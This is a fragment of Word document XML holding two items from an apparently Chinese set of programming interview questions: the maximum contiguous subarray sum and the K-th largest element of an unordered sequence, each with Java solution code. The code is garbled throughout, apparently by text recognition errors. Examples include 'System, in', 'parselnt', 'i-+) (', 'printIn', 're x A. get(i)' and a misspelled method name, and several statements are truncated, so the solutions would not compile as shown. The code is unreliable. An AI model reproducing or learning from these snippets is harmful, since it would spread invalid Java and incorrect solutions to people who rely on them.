      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="480" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="220" w:name="bookmark229"/>
      <w:bookmarkStart w:id="221" w:name="bookmark230"/>
      <w:bookmarkStart w:id="222" w:name="bookmark231"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>34.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>给定无序整数序列，求连续子串最大和。</w:t>
      </w:r>
      <w:bookmarkEnd w:id="220"/>
      <w:bookmarkEnd w:id="221"/>
      <w:bookmarkEnd w:id="222"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>package coding;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>import java. util. *;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:pBdr>
          <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>public class Main {</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public static void main(String[. args) {</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Scanner in = new Scanner(System, in);</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String nextLine = in. nextLine();</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String[] splits = nextLine. split</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ArrayList&lt;Integer&gt; A = new ArrayList&lt;Integer&gt; (); for (int i = 0; i &lt; splits.length; i++) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="920" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>A. add(integer, parselnt (splits[i]));</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if(A==nullI I A. size()==0) return ;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1360" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ArrayList&lt;Integer&gt; result = new ArrayList&lt;Integer&gt; (); result, add(-l);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1360" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>result, add(-l);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1360" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int min = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1360" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int max = Integer. MIN_VALUE;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1360" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int minpos = ~1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1360" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int sum = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1360" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>for(int i = 0;i&lt;A.size();i-+) (</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1780" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>sum += A. get (i);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1780" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if(sum </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>min &gt; max){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>result, set(0 , minpos);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">max = sum </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>min;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>result.set (1 , i);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="17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1780" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if(sum &lt; min){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>min = sum;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>minpos = i;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="178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3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1360" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int temp = result, get(0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1360" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>result, set(0 , temp + 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1360" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int re </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="380" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1780" w:right="0" w:hanging="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>for(int i = result, get(0); i &lt;= result.get(1); i ++){ re x A. get(i);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1360" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>System, out. printIn(max);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:pBdr>
          <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="223" w:name="bookmark232"/>
      <w:bookmarkStart w:id="224" w:name="bookmark233"/>
      <w:bookmarkStart w:id="225" w:name="bookmark234"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>35.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>给定无序整数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>序列，求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>其中第</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>大的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>数。</w:t>
      </w:r>
      <w:bookmarkEnd w:id="223"/>
      <w:bookmarkEnd w:id="224"/>
      <w:bookmarkEnd w:id="225"/>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package cn. thinkingl?</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import java. io. *;</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import java. util. *;</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public class NOK {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>public static void main(String args[])</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Scanner in = new Scanner(System, in);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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String nextLine = in. nextLine();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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int kth = in. nextlnt ();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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String[] splits = nextLine. split</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">“)； </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int[] numbers = new int [splits, length];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1660" w:right="0" w:hanging="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>for (int i = 0; i &lt; numbers, length; i++) { numbers[i] = Integer.parselnt(splits[i]);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="620" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>System, out. printIn(kthLargestElement (2, numbers));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:hanging="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>public static int kthLargestElenent(int k, int[] nums) { if (nums == null || nums.length == 0) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="16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if (k &lt;= 0){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
